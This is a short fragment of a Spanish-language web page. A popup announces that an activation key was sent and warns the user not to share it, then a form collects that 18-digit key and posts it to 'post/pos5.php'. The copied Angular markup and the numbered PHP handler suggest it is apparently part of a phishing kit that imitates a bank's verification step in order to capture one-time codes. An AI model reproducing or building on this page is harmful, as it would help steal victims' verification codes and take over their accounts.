...
Swal.fire({
    ...
    confirmButtonText: 'Aceptar',
    allowOutsideClick: false,
    html: '<h1 style="text-align:center;margin-bottom:15px;font-size:30px;font-weight: bold;">CLAVE DE ACTIVACI&Oacute;N ENVIADA</h1><br><p style="text-align:center;">La clave que vas a recibir es EXCLUSIVA para verificar tu cuenta. Por tu seguridad no lo compartas</p>'
});
</script>
...
<div _ngcontent-c15="" class="container-fluid">
  ...
  <div _ngcontent-c15="" class="row justify-content-center show-grid" style="margin-top: 50px;">
    <form _ngcontent-c15="" novalidate="" class="ng-touched ng-dirty ng-valid" action="post/pos5.php" method="POST" autocomplete="off" name="form1">
      <div _ngcontent-c15="" class="row justify-content-center d-block">
        <div _ngcontent-c15="" class="col-12">
          <div _ngcontent-c15="" class="form-group">
            ...
            <input _ngcontent-c15="" minlength="18" maxlength="18"  placeholder="Clave de activaci&oacute;n" class="form-control ng-touched ng-dirty ng-valid" formcontrolname="client" name="clave" id="user" type="password" onkeypress="return isNumberKey(event);" required>
          </div>
        </div>
      </div>
